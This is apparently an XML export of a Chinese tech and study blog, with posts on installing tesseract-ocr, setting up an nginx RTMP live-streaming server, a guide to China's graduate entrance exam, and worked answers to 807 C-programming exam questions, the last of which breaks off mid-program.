    <content type="text"><![CDATA[ubantu 使用命令sudo apt install tesseract-ocr安装tesseract-ocr 使用命令whereis tesseract-ocr查看tesseract-ocr的位置 使用命令cd /usr/share/tesseract-ocr进入到tesseract-ocr的位置 使用命令ls查看该目录下有什么 使用命令cd tessdata/进入到tessdata目录 使用命令pwd打印当前工作目录，记录下打印出来的结果/usr/share/tesseract-ocr/tessdata 使用vim编辑/etc/profile，命令sudo vim /etc/profile 使用i进入insert模式，使用方向键，将光标移动到最末未位置，添加一行export TESSDATA_PREFIX=/usr/share/tesseract-ocr/tessdata :x保存并退出，使用source命令刷新/etc/profile enjoy it! centos7 先尝试安装tesseract，命令 1sudo yum install tesseract 如果安装成功，直接进入第6步，否则，从第2步往下依次执行 添加yum源，命令 1sudo yum-config-manager --add-repo https://download.opensuse.org/repositories/home:/Alexander_Pozdnyakov/CentOS_7/ 导入密钥，命令 1sudo rpm --import https://build.opensuse.org/projects/home:Alexander_Pozdnyakov/public_key 更新，命令 1sudo yum update 安装tesseract，命令 1sudo yum install tesseract 查看tesseract的位置，命令 1whereis tesseract 记住，图中标出来的位置/usr/share/tesseract cd到该位置，命令 1cd /usr/share/tesseract/ 列出该目录下的文件，命令 1ls 重复第7，8步骤，直到进入tessdata目录下 打印当前工作目录，命令 1pwd 记住打印出来的结果/usr/share/tesseract/4/tessdata 接下来的步骤和ubantu安装步骤的第7步往下是一模一样的了 其他操作系统请参考官方文档]]></content>
      <categories>
        <category>linux</category>
        <category>ubantu</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>tesseract-ocr</tag>
        <tag>ubantu</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx搭建直播服务器]]></title>
    <url>%2Fposts%2F7a7901bf%2F</url>
    <content type="text"><![CDATA[Linux下nginx源码安装并关联rtmp模块 卸载原有的nginx 1sudo apt autoremove nginx 下载nginx源码 1wget http://nginx.org/download/nginx-1.15.3.tar.gz 解压源码 1tar -zxvf nginx-1.15.3.tar.gz 下载nginx rtmp模块 1wget https://github.com/arut/nginx-rtmp-module/archive/v1.2.1.tar.gz 解压rtmp模块 1tar -zxvf v1.2.1.tar.gz 安装编译nginx所需要的库 1sudo apt install build-essential libpcre3 libpcre3-dev libssl-dev -y 进入nginx的解压目录 1cd nginx-1.15.3/ 关联rtmp模块 1./configure --prefix=./bin --add-module=../nginx-rtmp-module-1.2.1 编译安装 1make &amp;&amp; make install 启动nginx，查看效果 1./bin/sbin/nginx Linux下配置上一步安装好的nginx 编辑nginx配置文件 1vim bin/conf/nginx.conf 根结点下新增rtmp配置，如下 123456789101112rtmp &#123; server &#123; listen 1935; chunk_size 4000; application live &#123; live on; record off; allow play all; max_connections 1024; &#125; &#125;&#125; 保存后，重启nginx服务 1./bin/sbin/nginx -s reload windows下安装FFmpeg，用来推流 访问https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-latest-win64-static.zip，下载最新版FFmpeg 解压到相关目录 Windows下使用FFmpeg进行推流测试 在上图中，框起来的地方输入cmd，按enter 推流，[host]换成你的服务器地址，[port]换成你的nginx监听rtmp协议的端口 1ffmpeg.exe -i 1.mp4 -f flv rtmp://[host]:[port]/live/room Windows下使用支持rtmp协议的播放器测试 以爱奇艺万能视频播放器举例 选择在线播放，输入地址rtmp://[host]:[port]/live/room，地址保证和你上面推流的地址相同即可 成功 附上一个使用video.js播放rtmp直播流视频的demo 注意：需要在服务器上运行，可以是本地服务器，不能直接使用浏览器打开 demo代码 1234567891011121314151617&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;Player&lt;/title&gt; &lt;link href="https://unpkg.com/video.js/dist/video-js.css" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt;&lt;video id="video" class="video-js vjs-default-skin" controls autoplay="autoplay" width="640" height="320" data-setup='&#123;&#125;'&gt; &lt;source src="rtmp://www.zimo.wiki/live/room" type="rtmp/flv" /&gt;&lt;/video&gt;&lt;script src="https://unpkg.com/video.js/dist/video.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.jsdelivr.net/npm/videojs-flash@2/dist/videojs-flash.min.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 效果]]></content>
      <categories>
        <category>linux</category>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>linux</tag>
        <tag>直播服务器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科普文——考研须知]]></title>
    <url>%2Fposts%2F27a372c3%2F</url>
    <content type="text"><![CDATA[前言 &nbsp;&nbsp;&nbsp;&nbsp;最近不少同学向博主问起关于考研的一些问题，博主觉得这些问题可能是每个想考研的同学都会遇到的，比较有代表性，于是博主写下这篇文章在这里做一下统一的解答，同时也希望能对各位同学做出考研规划起到一定的帮助作用。博主将通过这篇文章向大家系统性的介绍一下考研。 关于硕士研究生的一些概念 &nbsp;&nbsp;&nbsp;&nbsp;中国实行的硕士研究生学位教育主要分为：学术型学位（学术理论研究）和专业型学位（注重操作实际能力）两种教育并轨，但一直以来，更偏重学术型学位教育，而少注重专业型学位教育，所以这导致了很多学术型学位研究生毕业后，只能大谈阔论，能理论能研究，但操作能力（这里其实很相对，毕竟学术能到这个阶段的人，只要不造假之类的，一般都不会太差，再弱也比很多本科生强）差。因此为了能与国际硕士研究生学位教育接轨，增加了专业型研究生教育。 学硕 &nbsp;&nbsp;&nbsp;&nbsp;学硕的全称是学术性硕士，顾名思义也就是注重学术方面研究的硕士研究生，再通俗一些就是学校以课本理论为主进行的人才培养。至于实践方面，可以说是辅助，而理论研究一定是被放在首要位置进行的培养内容。学术型硕士主要是为专业领域培养研究人员或者是为高校输送人才等。 专硕 &nbsp;&nbsp;&nbsp;&nbsp;专硕的全称是专业型硕士，与学硕进行对比就是重实践，轻理论。当然，这都是相对而言的，轻理论并不是完全忽视理论，而是与实践对比的情况下，学校会在实践方面花费大量的时间对学生进行培养，课本理论只是辅助，不作为重点培养方向。由此可见，专硕更像是为社会的各企业单位培养人才。 学硕和专硕的区别 &nbsp;&nbsp;&nbsp;&nbsp;专业型硕士学制一般为两年（但有的学校专硕也是三年），目的是为了培养一些应用型人才，培养方向更加注重实践操作，是为了给某个特定的职业培养掌握专业技能的和的高层次的人才，一般是想要在某个特定职业领域深入学习的人选择的学位。而学术型硕士的学制一般为三年（其实也有两年的，具体院校不同培养方案不同），主要是为了培养科学研究型人才，培养方向侧重理论教育，学术型硕士的就职方向多为大学教师和科研机构人员。&nbsp;&nbsp;&nbsp;&nbsp;另外二者的学费也不同，一般而言专业型硕士的学费要比学术型硕士高一些。 博主建议 &nbsp;&nbsp;&nbsp;&nbsp;读完硕士阶段就准备找工作的同学读专业型硕士更有帮助，而学术型硕士对打算继续读博士的人更好。 相关问题——学硕专硕到底哪个更好？ &nbsp;&nbsp;&nbsp;&nbsp;肯定还有一部分同学还是不能做出选择，就只想问一句——“学硕和专硕哪个更好？”。其实就实际而言，针对当今的社会的就业环境而言，并不是读学硕出来的同学就必须当科研人员，高校教师或者继续读博，专硕的同学就必须到公司工作，而不能搞研究，读博之类的，毕竟事无绝对。二者实际上没有那么绝对的限制，并且本身二者也就没有什么高低好坏，所以大家不应该去问学硕、专硕哪个更好，而应该把关注点放在自己的偏好和能力上，找到适合自己的方向就是最好的。&nbsp;&nbsp;&nbsp;&nbsp;所以最后的结论是，适合自己的才是最好的。 关于考研目标院校的一些概念 &nbsp;&nbsp;&nbsp;&nbsp;根据报考目标院校学科建设情况的不同，分为五类院校，由好到差分别是：985院校、211院校、双一流院校、双一流学科院校、一般院校。 985院校 &nbsp;&nbsp;&nbsp;&nbsp;985相信大家都听说过，这里不做过多概述，反正这个是最好的目标院校，但是最好也就意味着考上的难度最大。 211院校 &nbsp;&nbsp;&nbsp;&nbsp;211相信大家也都听说过，这里不做过多概述。 双一流院校 &nbsp;&nbsp;&nbsp;&nbsp;双一流院校是指学校的综合实力（几乎所有专业学科）达到了双一流的水平。 双一流学科院校 &nbsp;&nbsp;&nbsp;&nbsp;双一流学科院校是指学校的某（几）个学科达到了双一流的水平（有可能这个学科在全国排名都是靠前的，比如成都理工大学，地质科学专业全国第一，甚至连北大和清华都比不上，没什么好说的，毕竟著名地质学家，李xx就是成都理工大学毕业的）。注意区分双一流院校和双一流学科院校的区别。 一般院校 &nbsp;&nbsp;&nbsp;&nbsp;相对来说是最差的院校（尽管是最差的，也比二本院校强很多了，毕竟很多二本压根都没有研究生招生资格的），但是同时也代表着最容易考上。 关于考研的一些概念考研是什么 &nbsp;&nbsp;&nbsp;&nbsp;全国硕士研究生统一招生考试（Unified National Graduate Entrance Examination），简称“考研”。是教育主管部门和招生机构为选拔研究生而组织的相关考试的总称，是国家统考规格最高的考试（这里其实大家可能会有疑问，考研就最高了？那考博呢？需注意，考博已经不是全国统考了），跟高考一样，每年考一次。 考研包括哪些阶段 &nbsp;&nbsp;&nbsp;&nbsp;一般来说分为初试和复试两个阶段，初试时间一般在每年倒数第二个周末（一般来说大概在12月21号左右），复试时间根据报考单位的不同而有所不同（大部分是在3月中旬到5月初）。 考研初试科目和分数组成 政治：100分英语：100分数学或专业基础：150分专业课：150分总分：500分 考研初试科目考试范围和考试方式政治 考试方式：全国统考 考试范围：大学期间的所有思想政治课程公选课和时政（形势与政策），分别是：《思修》、《近代史》、《毛概》、《马原》、《当代时政》 英语 &nbsp;&nbsp;&nbsp;&nbsp;根据报考硕士类别的不同一般会有英语一和英语二的差别，一般学硕考英语一，专硕考英语二，难度英语一大于英语二，考试方式为全国统考。 数学或专业基础 &nbsp;&nbsp;&nbsp;&nbsp;数学分为数学一，数学二、数学三（只有经管专业考生考）。考试方式为全国统考。一般来说学硕考数学一，专硕考数学二，但也有部分院校考自命题（可能是数学自命题，可能是专业自命题，这个就属于专业基础的范围了），也有部分学校专硕也考数一，也有部分学校学硕也考数二，具体院校具体分析。数学一考试范围：《高等数学上、下》、《线性代数》、《概率论与数理统计》数学二考试范围：《高等数学上、下》（部分内容不考，如级数，三重积分等）、《线性代数》数学三考试范围：大部分同数一总结：数学一考的内容最多，数学二考的最少，但是考得最深（高数部分），而数学三的侧重点在于实际应用。 专业课 &nbsp;&nbsp;&nbsp;&nbsp;根据报考学校报考专业的不同而有所不同。一般来说，报考985/211的计算机专业是统考408。408考试范围：《数据结构》、《操作系统》、《计算机网络原理》、《计算机组成原理》 考研复试 &nbsp;&nbsp;&nbsp;&nbsp;复试是研究生考试制度的重要组成部分，即通过研究生入学考试（初试）后参加的，由报考院校组织进行的第二次考试。一般也分笔试和面试。早期的研究生复试多只是一种形式，但从引2006年起研究生招生加大了复试的权重，有的招生单位甚至把复试的权重加大至百分之五十，这就要求考生具有真才实学并具备更高的应变能力。复试考查范围极广。既有类似企业入职前的面试、笔试等阶段，又有英语口语的展示阶段。 关于考研的一些常见问题考研的信息从哪里获取？ &nbsp;&nbsp;&nbsp;&nbsp;唯一官方网站研招网 怎么选择报考学校？ &nbsp;&nbsp;&nbsp;&nbsp;根据个人情况和个人兴趣爱好去报考学校和专业。 考研应该从什么时候开始准备？ &nbsp;&nbsp;&nbsp;&nbsp;如果你志向远大，想考很好的学校，那么你就应该早做准备（最好从大一大二就开始）；如果你徘徊不定，犹豫不决，最晚你大四的时候就应该开始准备了，不过到了那个时候，你选择的学校一般不会太好，因为复习的时间不是特别充足。这个还得具体情况具体分析。 考研需要报班吗？ &nbsp;&nbsp;&nbsp;&nbsp;如果你是一个极其自律的人，那么你不需要报班；另一方面，如果你自认为不是自律的人的话，你可以报班，不过你得接受高额的费用。 考研应该怎么准备？ 确定目标院校，目标专业 确定学硕，专硕 确定考试科目 确定复习策略 持续努力，尽管大家都懂要想成功必须坚持努力这些道理，但其实能不能坚持下去真的得打上一个大大的问号？ 如有其它问题，欢迎联系博主或者直接留言，本文会及时更新致谢 全国硕士研究生统一招生考试 考研学硕和专硕究竟有哪些区别？差别很大！]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>科普</tag>
        <tag>常识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2019年真题答案以及解析]]></title>
    <url>%2Fposts%2F28b181d9%2F</url>
    <content type="text"><![CDATA[单项选择题 C语言编译程序的首要工作是A. 检查C程序的完整性B. 检查C程序的逻辑错误C. 检查C程序的语法错误D. 生成目标文件答案：C解析：C语言编译程序的首要工作就是检查C语言程序中是否存在语法错误,如果有则给出错误的提示信息，如果没有则生成对应的目标文件(.obj) 能正确表示a和b同时为正或同时为负的逻辑表达式是A. (a&gt;=O||b&gt;=O)&amp;&amp;(a&lt;0||b&lt;0)B. (a&gt;=0&amp;&amp;b&gt;=0)&amp;&amp;(a&lt;0&amp;&amp;b&lt;0)C. (a+b&gt;0)&amp;&amp;(a+b&lt;=0)D. a*b&gt;0答案：D解析：D选项可由乘法运算法则得到；其他选项可以举反例，A选项反例是a = 1,b = -1，结果为真；B选项永远为假；C选项同样永远为假 下面程序运行后的输出结果是 123456789101112#include&lt;stdio.h&gt;int fun(int x)&#123; return x;&#125;int main()&#123; float a = 3.14; a = fun(a); printf("%.2f\n",a); return 0;&#125; A. 3.00 B. 3.14 C. 3 D. 0 答案：A 解析：函数参数类型以形参为准，在主函数调用fun函数的时候，传递的a是3.14，然后到了fun中就被强制转换为了整型数3，然后这个返回值又赋值到了a中，于是此时a中的值是浮点数3.0000（不精确的一个很接近3的小数值，浮点数都有误差），这里有一次自动类型转换，所以最后输出的结果是3.00 下面程序段执行后，a的值为static int s[2][4] = {0,1,2,3,4,5,6,7};int a,*p;p = &amp;s[0][1];// p指向了值为1的位置a = (*p)*(*p+3)*(*p+5);A. 28B. 15C. 24D. 不确定答案：C解析：作为取值运算符时，优先级较低，所以会先进行p+3的运算，然后再取值，p指向1的位置，p+3指向4的位置，所以\(p + 3)的值是4，同理，*(p+5)的值是6，最终a = 1 * 4 * 6 = 24，二维数组本身在内存中的存储方式是按一维数组存储的，连续的 在位运算中，操作数每左移1位，其结果相当于A. 操作数除以2B. 操作数乘以2C. 操作数除以4D. 操作数乘以4答案：B解析：计算机底层的数据只有2进制，以最常见的八位二进制数00000001（十进制数1）为例，左移一位将变为00000010（十进制数2），最高位的0将会被丢掉（左移不管最高位是0还是1，都会丢掉），所以左移相当于是x2，同理，右移，有一点点小区别，最低位的0被丢掉了（右移不管最低位是0还是1，都会丢掉），然后最高位空了，这是不行的，计算机会进行高位补0的操作，所以右移相当于/2，看不懂我的叙述就在纸上模拟一般这个过程，大概就明白了 若有定义int a[3][4];则输入其3行2列元素的正确语句是A. scanf(“%d”,a[3,2]);B. scanf(“%d”,*(*(a+2)+1));C. scanf(“%d”,(a+2)+1);D. scanf(“%d”,(a[2]+1);答案：C解析：3行2列元素是a[2][1]，scanf函数的参数是指针（地址值），所以合法的应该是&amp;a[2][1]，而&amp;a[2][1]等价于*((a+2)+1) 将p定义为指向含4个元素的一维数组的指针变量，正确语句是A. int (p)[4];B. int *p[4];C. int *p[4];D. int p[4];答案：A解析：B选项是指针数组；C选项也是指针数组；D选项就是数组 有如下定义:struct person {char name[9];int age;};struct person class[10]=({&quot;Johu&quot;,17,&quot;Paul&quot;,19,&quot;Mary&quot;,18,&quot;Adam&quot;,16};根据上述定义，能输出字母M的语句是A. print(“%c\n”,class[3].name);B. print(“%c\n”,class[3].name[1]);C. print(“%c\n”,class[2].name[1);D. print(“%c\n”,class[2].name[0]);答案：D解析：class[2]是{“Mary”,18}，class[2].name[0]就是字母’M’ 若已建立下图所示的单链表结构:在该链表结构中，指针p、s分别指向图中所示结点，则不能将s所指的结点插入到链表末尾仍构成单向链表的语句组是A. p=p-&gt;next; s-&gt;next=p; p-&gt;next=s;B. p=p-&gt;next; s-&gt;next=p-&gt;next; p-&gt;next=s;C. s~&gt;next=NULL; p=p-&gt;next; p-&gt;next=s;D. p=(*p).next; (*s).next=(*p).next; (*p).next-s;答案：A解析：p=p-&gt;next;将p后移了一个，现在的p指向末尾的结点了，s-&gt;next=p;将p，也就是链表的末尾赋值给s的指针域，s-&gt;next现在指向末尾结点位置，p-&gt;next=s，将s赋值给p的指针域，也就是现在链表末尾的结点指向s，没有构成链表，换句话说，这样的操作导致链表断掉了 在一个源文件中，定义的全局变量的作用域为A. 本文件的全部范围B. 从定义该变量的位置开始至本文件结束C. 本函数的全部范围D. 本程序的全部范围答案：B解析：多次强调过全局变量的作用域了，如还不知道，请翻阅前几年的真题解析 判断题 用do-while语句构成的循环，在while后的表达式为零时结束循环答案：√解析：这里的表达式指的是是do{}while(表达式)语句中，while后面括号里的表达式 在用字符串常量初始化字符数组时，数组长度应等于字符串有效字符的个数答案：×解析：一般数组长度应该大于字符串有效字符的个数，因为末尾会自动加上结束符’\0’，但是实际情况中，用这种方式初始化的时候，一般不指定数组长度，由编译器自动确定 若使用数组名作为函数调用的实参，则传递给形参的是实参数组中全部元素的值答案：×解析：传递的是数组首地址，一般情况下，数组名都代表数组首地址 在C语言复合语句中定义的变量只在该复合语句中有效答案：√解析：在复合语句（一般是由一对花括号中间的语句块）中定义的变量也是局部变量，作用范围自然是从定义的地方开始，到语句块结束 在switch语句中break语句必须和case配对使用答案：×解析：default后也可写break 函数调用时，如果形参和实参的类型不一致,以实参为准答案：×解析：应该以形参为准，这样的函数调用过程，会存在自动类型转换的过程 自增运算符(++)或自减运算符(--)只能用于变量，不能用于常量或表达式答案：√解析：不能用于常量是一定的，这里解释下为什么不能用于表达式，这是因为表达式一旦确定（表达式的操作数确定，表达式的运算符确定），表达式的值其实就已经确定了，而表达式的值是CPU调度程序完成计算之后，临时存储在寄存器中的，所以相当于常量，不能修改 若定义int(*p)[];则p是一个指向一维数组的指针变量答案：×解析：没给大小，这里必须要指定大小，代表指向有几个元素的一维数组指针变量 数组初始化时被赋值的元素的个数决定了这个数组所占内存单元的个数答案：×解析：数组的大小在声明时已经给出，而不是由初始化被赋值元素的个数决定的 在程序中定义一个结构体类型后，编译器将为结构体的各成员分配存储空间答案：×解析：定义类型并不会分配空间，只有在定义变量时才会分配内存空间 程序分析题 阅读程序，描述程序的功能，当输入: Zhangsen 28/Liming 58/Liuwei 40/时，写出运行结果。(/表示回车，后同) 12345678910111213141516171819202122#include&lt;stdio.h&gt;struct person&#123; char name[20]; int age;&#125;man[3];int main()&#123; int i,key = 0; struct person *p,*q; for (i = 0;i &lt; 3;i++) scanf("%s %d",man[i].name,&amp;man[i].age); for (p = man;p &lt; man + 3;p++) &#123; if (p-&gt;age &gt; key) &#123; q = p; key = p-&gt;age; &#125; &#125; printf("%s,%d\n",q-&gt;name,q-&gt;age); return 0;&#125; 答案： 功能：输入三个人的姓名和年龄，存入结构体数组中，输出三者中年龄最高的人的所有信息 输出结果：Liming,58 阅读程序，描述程序的功能，写出程序运行结果 1234567891011121314151617181920212223#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char str1[100],str2[100]; char *p1,*p2; int k,j,i,len; p1 = str1; p2 = str2; scanf("%s",p1); scanf("%s",p2); k = j = i = 0; len = strlen(str2); while (p1[k] != '\0' &amp;&amp; p2[j] !='\0') &#123; if (p1[k] == p2[j]) &#123;k++;j++;&#125; else &#123;i++;k = i;j = 0;&#125; &#125; if (j &gt;= len) printf("Yes\n"); else printf("No\n"); return 0;&#125; 答案： 功能：输入两个字符串str1和str2，判断str2是不是str1的子串，是就输出Yes，否则输出No输出结果： 当输入: asdfgrty qwert/时，程序运行结果为: 当输入: asdfgrty fgrt/时，程序运行结果为: 阅读程序，描述程序的功能，当输入：This is a test of C Program Language!/，写出程序运行结果 12345678910111213141516#include"stdio.h"int main()&#123; char str[80]; int i = 0; gets(str); while (str[i] != '\0') &#123; if (str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') str[i] = str[i] - 'a' + 'A'; else if (str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') str[i] = str[i] - 'A' + 'a'; i++; &#125; printf("%s\n",str); return 0;&#125; 答案： 功能：将输入的字符串中的字母进行字母大小写互换输出结果：tHIS IS A TEST OF c pROGRAM lANGUAGE! 程序设计题 请编写函数fun,函数的功能是求出二维数组a周边元素之和，作为函数值返回。例如:若二维数组如下:1 3 5 7 92 9 9 9 46 9 9 9 81 3 5 7 0则函数返回值为61。在主函数中赋予二维数组(大小为M*N, M、N由符号常量确定)值，调用fun函数进行计算，并输出计算结果。要求自行设计fun函数，在主函数中，输入、输出时，应显示适当提示信息答案： 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#define M 4#define N 5int fun(int a[M][N])&#123; int sum = 0,i,j; for (i = 0;i &lt; M;i++) &#123; for (j = 0;j &lt; N;j++) &#123; if (i == 0 || i == M - 1) &#123; // 第一行和最后一行全加 sum += a[i][j]; &#125; else &#123; // 其他行只加第一列和最后一列 if (j == 0 || j == N - 1) &#123; sum += a[i][j]; &#125; &#125; &#125; &#125; return sum;&#125;int main()&#123; int a[M][N],i,j,sum; printf("请输入数组a[%d][%d]，共%d个整数\n",M,N,M * N); for (i = 0;i &lt; M;i++) &#123; for (j = 0;j &lt; N;j++) &#123; scanf("%d",&amp;a[i][j]); &#125; &#125; sum = fun(a); printf("a的周边元素之和是：%d",sum); return 0;&#125; 学生的记录由学号、数学和C语言成绩(用整数表示)组成，输入N名学生的数据(N值由符号常量确定),统计C语言分数最高的学生的人数(注意:分数最高的学生可能不只一个)，并输出C语言分数最高的学生人数及其各项数据。要求输入、输出时，应显示适当的提示信息答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;#define N 10struct student&#123; char stuNum[20]; int math; int c;&#125;;void input(struct student *s,int n)&#123; int i; for (i = 0;i &lt; n;i++) &#123; printf("请输入第%d个学生的学号：",i + 1); scanf("%s",s[i].stuNum); printf("请输入第%d个学生的数学成绩：",i + 1); scanf("%d",&amp;s[i].math); printf("请输入第%d个学生的C语言成绩：",i + 1); scanf("%d",&amp;s[i].c); getchar();// 干掉残留的回车符，不然下次学号输入可能出错 &#125;&#125;int main()&#123; int m = 0,i,maxScore = 0; struct student stu[N],max[N]; printf("请输入学生信息：\n"); input(stu,N); for (i = 0;i &lt; N;i++) &#123; if (stu[i].c &gt; maxScore) &#123; maxScore = stu[i].c; &#125; &#125; for (i = 0;i &lt; N;i++) &#123; if (stu[i].c == maxScore) &#123; max[m++] = stu[i]; &#125; &#125; printf("统计结果：\n"); printf("C语言分数最高的学生人数是：%d\n",m); while (m-- &gt; 0) &#123; printf("学号：%s，数学成绩：%d，C语言成绩：%d\n",max[m].stuNum,max[m].math,max[m].c); &#125; return 0;&#125; 在主程序中输入10个字符串，调用sort函数进行冒泡排序，然后在主函数中输出排序结果，其中字符串长度不超过20，字符串排序方式(按字母序递增用1表示，按字母序递减用0表示)和待排序的字符串由参数传递给sort 函数。要求自行设计sort函数，在主函数中，输入、输出应有相应提示。答案： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 10#define M 20struct _string&#123; char *data;&#125;;void init(struct _string strs[N])&#123; int i; for (i = 0;i &lt; N;i++) &#123; strs[i].data = (char *) malloc(sizeof(char) * M); &#125;&#125;void input(struct _string strs[N])&#123; int i; for (i = 0;i &lt; N;i++) &#123; printf("请输入第%d个字符串：",i + 1); gets(strs[i].data); &#125;&#125;void print(struct _string strs[N]) &#123; int i; for (i = 0;i &lt; N;i++) &#123; printf("%s\n",strs[i].data); &#125;&#125;void retrieve(struct _string strs[N])&#123; int i; for (i = 0;i &lt; N;i++) &#123; free(strs[i].data); &#125;&#125;void sort(struct _string strs[N],int m)&#123; int i,j; if (m == 1) &#123; for (i = 0;i &lt; N - 1;i++) &#123; for (j = i + 1;j &lt; N;j++) &#123; if (strcmp(strs[i].data,strs[j].data) &lt; 0) &#123; char *t = strs[j].data; strs[j].data = strs[i].data; strs[i].data = t; &#125; &#125; &#125; &#125; else if (m == 0) &#123; for (i = 0;i &lt; N - 1;i++) &#123; for (j = i + 1;j &lt; N;j++) &#123; if (strcmp(strs[i].data,strs[j].data) &gt; 0) &#123; char *t = strs[j].data; strs[j].data = strs[i].data; strs[i].data = t; &#125; &#125; &#125; &#125;&#125;int main()&#123; struct _string strs[N]; init(strs);// 申请动态空间 input(strs);// 输入 sort(strs,1);// 排序 printf("按字母序递增：\n"); print(strs);// 输出 printf("按字母序递减：\n"); sort(strs,0); print(strs); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2018年真题答案以及解析]]></title>
    <url>%2Fposts%2F29047cc4%2F</url>
    <content type="text"><![CDATA[单项选择题 设整型变量x，y的值分别为0，1, 那么x || y的结果是A. 0B. 1C. 2D. 都不对答案：B解析：x || y，意思是x或者y，含义是x，y只要有一个非0，值就为1（真） 变量的指针，其含义是指该变量的A. 值B. 名C. 地址D. 一个标志答案：C解析：变量的指针，指向的是该变量所在的内存地址；变量的值指得是该变量所对应内存单元中存的值；变量名代表变量的标志（标识符） C语言源程序文件后缀为A. .cB. .objC. .exeD. .cpp答案：A解析：.obj是C程序程序编译时生成的中间代码文件目标文件；.exe是Windows上的可执行文件；.cpp是C++源程序文件 下列语句不具有赋值功能的是A. x*=y;B. z=l;C. x++;D. x+y;答案：D解析：A可写为x = x * y；C可写为x = x + 1； 若在某程序中定义了多个函数，则以下说法中正确的是A. C语言程序总是从main()函数开始执行。B. 在C语言程序中，要调用的函数必须在main()函数中定义。C. C语言程序总是从第一个定义的函数开始执行。D. C语言程序中的main()函数必须放在程序的最后部分。答案：A解析：main()函数是C程序的入口，所以总是会从main()函数开始执行；B选项，要调用的函数只需要把声明放在main函数的前面即可；A选项对，C选项就肯定错了；D选项，main()可以放在程序的任何地方（除了其他定义、声明等的内部） for(表达式1;表达式2;表达式3)中，能省略的表达式有A. 表达式1B. 表达式2C. 表达式3D. 3个都可以答案：D解析：for循环中的三个表达式都可省略，此时是个死循环 判断字符串s1的长度是否等于字符串s2的长度，应使用A. if (sI == s2)B. if(strlen(s1) == strlen(s2))C. if(strcmp(s1,s2))D. if(strcat(s1) &gt; strcat(s2))答案：B解析：A选项在判断s1，s2地址是否相同；C选项在判断s1字符串是否大于s2字符串，这里比较的是字符串内容不是指针地址；D选项直接是非法的，strcat函数不是这么用的 以下语句的输出结果是:int a=100, b=100;printf(&quot;%d %d\n&quot;, --a, b++);A. 100 100B. 99 99C. 99 100D. 100 101答案：C解析：printf从右到左入栈，然后从左到右打印（看不懂就忽略前面，直接看后面），--、++运算符放前面，先运算后使用，放后面，先使用后运算，所以结果是99 100，打印完成之后，b的值变为101，a的值是99 在以下结构体数组定义中，正确的是A. struct student { int no; char name[20]; float score };B. struct stu[20] { int no; char name[20]; float score; }C. struct student { int no; char name[20]; float score; } stu[20];D. student { int no; char name[20];float score; } stu[20];答案：C解析：A选项只是定义了一个结构类型，没有定义数组；B选项不合法；D选项也不合法 输入两个字符数组a,b的正确语句是A. puts(a, b);B. scanf(“%s%s”,a, b);C. scanf(“%s%s” ,&amp;a, &amp;b);D. gets(“a”); gets(“b”);答案：B解析：A选项puts函数是输出；C选项错在&amp;，字符数组本身就是地址（指针常量），所以用不着，多此一举了；D选项非法，尝试输入到常量区 判断题 在C程序中，语句之间必须要用分号;分隔答案：×解析：类似如下情况，两条if语句之间并没有使用分号，而是通过语句块的形式分隔 12345678910111213#include&lt;stdio.h&gt;int main()&#123; int a = 1; int b = 2; if (a == b) &#123; &#125; if (a &lt; b) &#123; &#125; return 0;&#125; C语言本身不提供输入输出语句，输入和输出操作是由函数来实现的答案：√解析：这是谭浩强的参考书上的原话 变量根据其作用域的范围可以分作全局变量和局部变量答案：√解析：全局变量的作用域是从定义的地方开始，到本文件结束；局部变量的作用域是从定义的地方开始，到语句块结束 C语言中可以使用如下语句定义数组: char a(10);答案：×解析：正确的定义方式应该使用方括号，char a[10]; 在C语言程序设计中，符号”/*“和”*/“ 之间的内容是C语言的注释答案：√解析：C语言中有两种注释方式，第一种是行注释”//“，从这两个斜杠开始，到本行结束；第二种是块注释，就是本题的这种 将数组a的首地址赋给指针变量p的语句是p=*a;答案：×解析：正确的语句是：p = a;但是需要注意的是，如果就按题目所说的方式写，编译器并不会报语法错误，而是在运行的过程中才会出现未知的错误，这种错误一般来说会导致程序崩溃 return 语句必须在每个函数中都出现答案：×解析；返回值类型为void（空类型）的函数中可以不出现，也可以出现，这种出现的情况，return语句不需要返回任何值，语义仅代表函数结束 C语言在执行循环嵌套语句时的顺序为，先执行内层循环再执行外层循环答案：×解析：先执行的肯定是外层循环，但是先执行结束的确是内层循环 一个指针变量可以指向不同类型的变量答案：√解析：指针变量确实可以指向不同类型的变量，但是这种情况下，有可能导致异常情况，建议不要使用；有一种可以使用的情况就是void *类型的指针变量，注意这里的void *代表的不是空指针类型，而是任意指针类型，也就是说，可以让这种类型的指针指向任何其他类型的变量，系统中的malloc函数的返回值类型就是这种通用的指针类型，这使得C程序变得更为的灵活 与if(E)语句中的(E) 等价的表达式是(E==0)答案：×解析：if(E)判断的是表达式E是否为0，如果不为0就执行，所以表达式为真的条件是E != 0 程序分析题 程序运行时，若输入以下字符串:This is a test program! 1230K描述程序的主要功能，并写出程序的运行结果 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char str[100]; int count[26] = &#123;0&#125;,i = 0; printf("请输入字符串:\n"); gets(str); while 